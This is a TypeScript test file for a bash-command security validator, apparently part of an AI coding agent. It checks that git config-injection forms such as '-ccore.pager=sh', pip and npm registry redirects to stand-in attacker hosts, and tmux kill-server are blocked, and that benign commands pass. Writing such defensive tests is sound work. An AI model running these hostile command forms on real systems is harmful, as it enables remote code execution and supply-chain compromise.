import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import {
  validateBashSecurity,
  CHECK_IDS,
  detectGitConfigRce,
  detectPackageManagerHijack,
  detectDestructiveTmux,
} from '../src/tools/bash-security.ts';

// ===========================================================================
// UNIT U015 (wave w66) — core/core/src/tools/bash-security.ts parity hardening
//
// Three confirmed Claude-Code parity gaps, all implemented as ADDITIVE deny
// validators (no restyle, no behavior removed):
//
//  Gap A — git global-flag config-injection RCE guard
//    (ref: tools/PowerShellTool/readOnlyValidation.ts:L1537-1642,
//          tools/BashTool/readOnlyValidation.ts). AMI's detectGitConfigRce only
//    recognised the SPACED inline form `git -c core.pager=<cmd>`. Claude also
//    rejects the ATTACHED form `-ccore.pager=sh` (git parses `-c<key>=<val>`
//    with no space — a parser differential), `--config-env=<key>=<env>` (sets an
//    RCE key from an env var), and `--exec-path=<dir>` (git runs its subcommand
//    binaries from an arbitrary directory). All three were previously ALLOWED.
//
//  Gap B — package-manager registry/index redirection hardening
//    (ref: utils/swarm/backends/it2Setup.ts:L90-127). Redirecting pip's index
//    (--index-url / --extra-index-url / -i) or npm/yarn/pnpm/bun's --registry to
//    an attacker host is a dependency-confusion / supply-chain vector. Claude
//    defends by running installs from $HOME (ignoring project pip.conf/.npmrc);
//    the command-string analog blocks an explicit on-CLI registry redirect.
//
//  Gap C — destructive tmux command guard
//    (ref: utils/tmuxSocket.ts:L1-24). Claude isolates its tmux onto a private
//    `claude-<pid>` socket so `tmux kill-server`/`kill-session` cannot kill the
//    user's own sessions. AMI has no socket isolation, so it blocks the
//    server-/session-wide destructive subcommands outright.
// ===========================================================================

describe('U015/w66 Gap A — git global-flag config-injection RCE', () => {
  it('blocks the attached-form -c<key>=<cmd> (no space) for core.pager', () => {
    const r = validateBashSecurity('git -ccore.pager=sh log');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });

  it('blocks the attached-form -c<key>=<cmd> for core.sshcommand', () => {
    const r = validateBashSecurity('git -ccore.sshcommand=id fetch');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });

  it('blocks --config-env=<rce-key>=<env>', () => {
    const r = validateBashSecurity('git --config-env=core.pager=EVIL log');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });

  it('blocks --config-env <rce-key>=<env> (space-separated)', () => {
    const r = validateBashSecurity('git --config-env core.editor=EVIL commit');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });

  it('blocks --exec-path=<dir>', () => {
    const r = validateBashSecurity('git --exec-path=/tmp/evil log');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });

  it('blocks --exec-path <dir> (space-separated)', () => {
    const r = validateBashSecurity('git --exec-path /tmp/evil status');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });

  it('still blocks the pre-existing spaced inline form (regression lock)', () => {
    const r = validateBashSecurity('git -c core.pager=sh log');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });

  it('allows bare --exec-path query form', () => {
    assert.equal(validateBashSecurity('git --exec-path').safe, true);
  });

  it('allows a benign attached -c<non-rce-key>=<val>', () => {
    assert.equal(validateBashSecurity('git -ccolor.ui=always log').safe, true);
    assert.equal(validateBashSecurity('git -c user.name=Carlos commit -m x').safe, true);
  });

  it('allows a plain -C <dir> working-directory change', () => {
    assert.equal(validateBashSecurity('git -C /home/me/proj status').safe, true);
  });

  it('detectGitConfigRce returns a reason for each new RCE form', () => {
    for (const cmd of [
      'git -ccore.pager=sh log',
      'git --config-env=core.pager=EVIL log',
      'git --exec-path=/tmp/evil log',
    ]) {
      const r = detectGitConfigRce(cmd);
      assert.equal(r.blocked, true);
      assert.ok(r.reason && r.reason.length > 0);
    }
    assert.equal(detectGitConfigRce('git --exec-path').blocked, false);
  });
});

describe('U015/w66 Gap B — package-manager registry/index redirection', () => {
  it('blocks pip install --index-url to an http host', () => {
    const r = validateBashSecurity('pip install --index-url http://10.0.0.1/pypi evilpkg');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
  });

  it('blocks pip3 install --extra-index-url to an attacker host', () => {
    const r = validateBashSecurity('pip3 install --extra-index-url http://attacker.test/simple pkg');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
  });

  it('blocks pip install -i <url> short form', () => {
    const r = validateBashSecurity('pip install -i https://evil.test/simple pkg');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
  });

  it('blocks npm install --registry redirect', () => {
    const r = validateBashSecurity('npm install --registry http://evil.test leftpad');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
  });

  it('blocks yarn add --registry and pnpm install --registry= redirects', () => {
    assert.equal(validateBashSecurity('yarn add --registry http://evil.test left-pad').safe, false);
    assert.equal(validateBashSecurity('pnpm install --registry=http://evil.test x').safe, false);
  });

  it('allows ordinary installs with no registry redirect', () => {
    assert.equal(validateBashSecurity('pip install requests').safe, true);
    assert.equal(validateBashSecurity('pip install -r requirements.txt').safe, true);
    assert.equal(validateBashSecurity('npm install leftpad').safe, true);
    assert.equal(validateBashSecurity('npm ci').safe, true);
    assert.equal(validateBashSecurity('yarn add left-pad').safe, true);
  });

  it('does not treat a bare --index-url with no URL value as a redirect', () => {
    // `--index-url pkg` (non-URL value) is not a redirect to a remote host.
    assert.equal(validateBashSecurity('pip install --index-url pkg').safe, true);
  });

  it('detectPackageManagerHijack reports a supply-chain reason', () => {
    const r = detectPackageManagerHijack('pip install --index-url http://10.0.0.1/pypi evilpkg');
    assert.equal(r.blocked, true);
    assert.match(r.reason!, /dependency-confusion|supply-chain/);
  });
});

describe('U015/w66 Gap C — destructive tmux command guard', () => {
  it('blocks tmux kill-server', () => {
    const r = validateBashSecurity('tmux kill-server');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.DESTRUCTIVE_TMUX);
  });

  it('blocks tmux kill-session -t 0', () => {
    const r = validateBashSecurity('tmux kill-session -t 0');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.DESTRUCTIVE_TMUX);
  });

  it('blocks tmux with a leading option before the kill subcommand', () => {
    const r = validateBashSecurity('tmux -L default kill-server');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.DESTRUCTIVE_TMUX);
  });

  it('blocks a destructive tmux at the end of a pipeline/compound', () => {
    const r = validateBashSecurity('echo hi && tmux kill-session');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.DESTRUCTIVE_TMUX);
  });

  it('allows read-only / benign tmux subcommands', () => {
    assert.equal(validateBashSecurity('tmux ls').safe, true);
    assert.equal(validateBashSecurity('tmux list-sessions').safe, true);
    assert.equal(validateBashSecurity('tmux new-session -d -s work').safe, true);
    assert.equal(validateBashSecurity('tmux send-keys -t work "ls" Enter').safe, true);
  });

  it('allows commands that merely mention tmux as a non-command token', () => {
    // Not blocked because there is no `tmux` command word at all.
    assert.equal(validateBashSecurity('cat tmux-notes.txt').safe, true);
  });

  it('detectDestructiveTmux is a no-op when no tmux is present', () => {
    assert.equal(detectDestructiveTmux('ls -la').blocked, false);
    assert.equal(detectDestructiveTmux('tmux kill-pane').blocked, false);
  });
});
